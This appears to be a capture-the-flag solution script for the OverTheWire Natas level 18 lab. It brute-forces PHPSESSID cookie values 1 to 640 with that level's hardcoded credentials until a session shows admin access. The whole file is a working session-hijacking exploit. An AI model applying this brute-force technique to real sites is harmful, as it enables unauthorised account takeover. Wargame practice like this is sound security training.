import requests

params = ("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

for n in range(1,641):
        print(n)
        res = requests.get(
            "http://natas18.natas.labs.overthewire.org/index.php?debug",
            auth=params,
            cookies={'PHPSESSID':str(n)}
            )
        if (b"You are an admin" in res.content):
            print(res.content)
            break
